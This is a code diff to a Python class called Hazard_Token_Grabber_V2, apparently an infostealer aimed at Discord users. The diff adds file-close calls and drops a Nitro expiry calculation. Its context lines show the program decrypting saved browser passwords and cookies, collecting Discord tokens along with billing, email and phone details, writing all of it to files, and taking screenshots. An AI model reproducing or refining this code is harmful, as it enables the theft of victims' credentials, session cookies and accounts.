@@ -121,12 +121,13 @@ class Hazard_Token_Grabber_V2:
                     f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
         except:
             pass
+        f.close()
         cursor.close()
         conn.close()
         try:
             os.remove("Loginvault.db")
         except:
-            pass
+            pass  
 
     def grabCookies(self):
         master_key = self.get_master_key()
@@ -150,6 +151,7 @@ class Hazard_Token_Grabber_V2:
                     f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
         except:
             pass
+        f.close()
         cursor.close()
         conn.close()
         try:
@@ -240,15 +242,11 @@ class Hazard_Token_Grabber_V2:
                 nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
                 has_nitro = False
                 has_nitro = bool(len(nitro_data) > 0)
-                if has_nitro:
-                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                    days = abs((d2 - d1).days)
-                days_left = days if has_nitro else "0"
 
                 billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                 
-                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nNitro Expires in: {days_left} day(s)\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
+                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
+                f.close()
 
     def screenshot(self):
         image = pyautogui.screenshot()
